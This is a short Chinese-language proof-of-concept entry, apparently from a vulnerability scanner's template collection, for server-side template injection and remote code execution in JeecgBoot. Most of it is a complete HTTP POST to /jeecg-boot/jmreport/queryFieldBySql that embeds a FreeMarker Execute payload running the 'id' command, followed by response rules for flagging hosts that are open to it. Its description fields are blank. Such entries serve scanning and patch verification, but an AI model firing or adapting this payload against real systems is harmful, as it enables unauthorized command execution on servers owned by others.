﻿# JeecgBoot SSTI RCE漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json

{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }' "}
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?code)(?=.*?200).*?$

> 上传文件定位：

> 验证文件来源：JeecgBoot SSTI RCE漏洞.poc
